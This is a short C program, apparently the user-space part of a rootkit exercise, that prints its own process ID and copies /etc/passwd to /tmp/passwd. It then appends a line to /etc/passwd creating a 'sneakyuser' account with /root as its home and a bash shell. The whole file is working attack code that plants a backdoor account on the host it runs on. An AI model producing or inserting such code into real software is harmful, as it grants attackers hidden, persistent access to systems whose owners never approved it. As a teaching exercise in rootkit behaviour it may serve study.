#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

extern char **environ;
// Step 1: print its own process ID to the screen
void print_info() {
  printf("sneaky_process pid = %d\n", getpid());
}

// Step 2: insert a line to passwd file
void copy_file() {
  pid_t cpid, w;
  int wstatus;

  cpid = fork();
  if (cpid == -1) {
    perror("fork");
    exit(EXIT_FAILURE);
  }

  if (cpid == 0) { /* Code executed by child */

    // copy /etc/passwd to /tmp/passwd
    char cmd[] = "/bin/cp";
    char src[] = "/etc/passwd";
    char des[] = "/tmp/passwd";
    char *const argv[] = {cmd, src, des, NULL};
    execve(cmd, argv, environ);
  }
  else { /* Code executed by parent */
    w = waitpid(cpid, &wstatus, WUNTRACED | WCONTINUED);
    if (w == -1) {
      perror("waitpid");
      exit(EXIT_FAILURE);
    }
    // append sneakyuser:abc123:2000:2000:sneakyuser:/root:bash  to /etc/passwd
    FILE *f = fopen("/etc/passwd", "a");
    fprintf(f, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
    fclose(f);
  }
}
int main() {
  print_info();
  copy_file();

  return EXIT_SUCCESS;
}